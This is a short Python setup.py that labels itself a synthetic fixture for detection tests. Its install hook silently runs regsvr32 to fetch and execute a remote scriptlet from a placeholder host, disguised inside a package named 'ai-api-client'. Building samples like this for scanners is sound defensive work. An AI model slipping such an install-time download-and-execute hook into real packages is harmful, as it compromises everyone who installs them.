# FIXTURE ONLY - synthetic detection test sample, not real malware
import subprocess
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen(
            ["regsvr32", "/s", "/n", "/u", "/i:https://payload.example.test/x.sct", "scrobj.dll"],
            creationflags=0x00000008,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )


setup(name="ai-api-client", version="0.1.0", cmdclass={"install": PostInstall})
